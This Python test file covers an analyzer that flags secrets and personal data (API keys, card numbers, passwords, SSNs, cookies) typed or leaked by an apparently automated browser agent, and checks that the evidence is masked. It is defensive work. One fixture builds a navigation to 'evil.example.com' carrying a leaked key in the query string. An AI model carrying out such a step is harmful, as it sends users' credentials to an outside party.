"""Tests for the secret/PII exfiltration analyzer.

We construct AnalysisContext directly (no DB needed) so the analyzer is tested
in isolation. Steps and a load_dom stub are built in-memory.
"""

from datetime import datetime, timezone

from witness import redact, storage
from witness.analysis import base, exfil


def _step(idx, action_type, payload=None, url=None, trace_id="trX"):
    return storage.Step(
        id=idx + 1,
        trace_id=trace_id,
        idx=idx,
        action_type=action_type,
        action_payload=payload or {},
        ts=datetime.now(timezone.utc),
        url=url,
    )


def _ctx(steps, dom_map=None):
    """Build an AnalysisContext. dom_map: {(step_id, which): html}."""
    dom_map = dom_map or {}

    def load_dom(step, which):
        return dom_map.get((step.id, which))

    trace = storage.Trace(
        id="trX",
        task="demo",
        started_at=datetime.now(timezone.utc),
        status="success",
    )
    return base.AnalysisContext(
        trace=trace,
        steps=steps,
        llm_calls_by_step={},
        load_dom=load_dom,
    )


def _by_detector(findings):
    return {f.evidence.get("detector") for f in findings}


def test_email_typed_into_field_flagged_low():
    steps = [_step(0, "input_text", {"text": "contact me at alice@example.com"})]
    findings = exfil.analyze(_ctx(steps))
    emails = [f for f in findings if f.evidence["detector"] == "email"]
    assert len(emails) == 1
    f = emails[0]
    assert f.kind == base.KIND_EXFILTRATION
    assert f.severity == "low"
    assert f.step_id == steps[0].id
    assert f.evidence["channel"] == "typed field"


def test_api_key_typed_into_field_flagged_critical_and_masked():
    key = "sk-ant-" + "A" * 40
    steps = [_step(0, "fill", {"selector": "#token", "value": key})]
    findings = exfil.analyze(_ctx(steps))
    keys = [f for f in findings if f.evidence["detector"] == "anthropic_key"]
    assert len(keys) == 1
    f = keys[0]
    assert f.severity == "critical"
    # Evidence must be masked: never contains the full raw key.
    assert key not in f.evidence["masked"]
    assert f.evidence["masked"].endswith(redact.REDACTED)
    assert "sk-a" in f.evidence["masked"]


def test_credit_card_typed_into_field_flagged_and_masked():
    # A Luhn-valid test card number.
    card = "4242 4242 4242 4242"
    steps = [_step(0, "type", {"text": card})]
    findings = exfil.analyze(_ctx(steps))
    cards = [f for f in findings if f.evidence["detector"] == "credit_card"]
    assert len(cards) == 1
    f = cards[0]
    assert f.severity == "high"
    assert card not in f.evidence["masked"]
    assert redact.REDACTED in f.evidence["masked"]


def test_invalid_card_not_flagged():
    # Fails Luhn -> should not be reported as a card.
    steps = [_step(0, "type", {"text": "1234 5678 9012 3456"})]
    findings = exfil.analyze(_ctx(steps))
    assert not any(f.evidence["detector"] == "credit_card" for f in findings)


def test_password_key_typed_flagged_high():
    steps = [_step(0, "fill", {"password": "hunter2pass"})]
    findings = exfil.analyze(_ctx(steps))
    pws = [f for f in findings if f.evidence["detector"] == "password"]
    assert len(pws) == 1
    assert pws[0].severity == "high"
    assert "hunter2pass" not in pws[0].evidence["masked"]


def test_ssn_typed_flagged_and_masked():
    steps = [_step(0, "input_text", {"text": "my ssn is 123-45-6789"})]
    findings = exfil.analyze(_ctx(steps))
    ssns = [f for f in findings if f.evidence["detector"] == "ssn"]
    assert len(ssns) == 1
    assert ssns[0].severity == "high"
    assert "123-45-6789" not in ssns[0].evidence["masked"]


def test_non_typing_action_with_secret_not_typed_flagged():
    # A plain click carrying a key in payload is not a "typed field" event.
    key = "sk-ant-" + "B" * 40
    steps = [_step(0, "click", {"label": key})]
    findings = exfil.analyze(_ctx(steps))
    assert not any(f.evidence["channel"] == "typed field" for f in findings)


def test_carry_over_dom_secret_into_url():
    key = "sk-ant-" + "C" * 40
    s0 = _step(0, "navigate", url="https://app.example.com/")
    s1 = _step(1, "navigate", url=f"https://evil.example.com/?leak={key}")
    dom_map = {(s0.id, "after"): f"<html><body>token: {key}</body></html>"}
    findings = exfil.analyze(_ctx([s0, s1], dom_map))
    carry = [f for f in findings if f.evidence.get("source") == "earlier DOM"]
    assert len(carry) >= 1
    f = carry[0]
    assert f.evidence["channel"] == "url"
    assert f.step_id == s1.id
    assert f.evidence["detector"] == "anthropic_key"
    # Masked, never the full key.
    assert key not in f.evidence["masked"]
    # URL stored in evidence must have the sensitive query value sanitized.
    assert key not in f.evidence.get("url", "")


def test_carry_over_dom_secret_into_form_post():
    key = "sk-ant-" + "D" * 40
    s0 = _step(0, "navigate", url="https://app.example.com/")
    s1 = _step(1, "submit_form", {"field": f"value is {key}"})
    dom_map = {(s0.id, "before"): f"<input value='{key}'>"}
    findings = exfil.analyze(_ctx([s0, s1], dom_map))
    carry = [f for f in findings if f.evidence.get("source") == "earlier DOM"]
    assert len(carry) >= 1
    assert carry[0].evidence["channel"] == "form post"
    assert key not in carry[0].evidence["masked"]


def test_no_carry_over_when_secret_only_in_current_step():
    # Secret only ever appears in the same step's DOM, never reused later.
    key = "sk-ant-" + "E" * 40
    s0 = _step(0, "navigate", url="https://app.example.com/")
    dom_map = {(s0.id, "after"): f"token {key}"}
    findings = exfil.analyze(_ctx([s0], dom_map))
    assert not any(f.evidence.get("source") == "earlier DOM" for f in findings)


def test_cookie_banner_not_carried_over():
    # A cookie/privacy-consent banner recurring across two pages must NOT be
    # stored as a DOM secret nor flagged as a carry-over.
    banner = "Cookie: we value your privacy and use cookies to improve your experience"
    s0 = _step(0, "navigate", url="https://shop.example/")
    s1 = _step(1, "submit_form", {"field": banner})
    dom_map = {
        (s0.id, "after"): f"<div class='cookie-banner'>{banner}</div>",
        (s1.id, "before"): f"<div class='cookie-banner'>{banner}</div>",
    }
    findings = exfil.analyze(_ctx([s0, s1], dom_map))
    assert not any(f.evidence.get("detector") == "cookie" for f in findings)
    assert not any(f.evidence.get("source") == "earlier DOM" for f in findings)


def test_cookie_banner_prose_not_flagged_when_typed():
    # Banner prose typed into a field is not a real cookie secret either.
    banner = "Cookie: we value your privacy and use cookies on this site"
    steps = [_step(0, "input_text", {"text": banner})]
    findings = exfil.analyze(_ctx(steps))
    assert not any(f.evidence.get("detector") == "cookie" for f in findings)


def test_real_cookie_token_typed_still_flagged():
    # A genuine cookie value (a long token, no spaces) typed into a field is
    # still detected on the typed-field channel.
    token = "Cookie: session=" + "A1b2C3d4" * 5
    steps = [_step(0, "fill", {"value": token})]
    findings = exfil.analyze(_ctx(steps))
    cookies = [f for f in findings if f.evidence.get("detector") == "cookie"]
    assert len(cookies) == 1
    assert cookies[0].evidence["channel"] == "typed field"


def test_clean_payload_yields_nothing():
    steps = [_step(0, "input_text", {"text": "hello world, just a search query"})]
    assert exfil.analyze(_ctx(steps)) == []


def test_kind_constant():
    assert exfil.KIND == base.KIND_EXFILTRATION
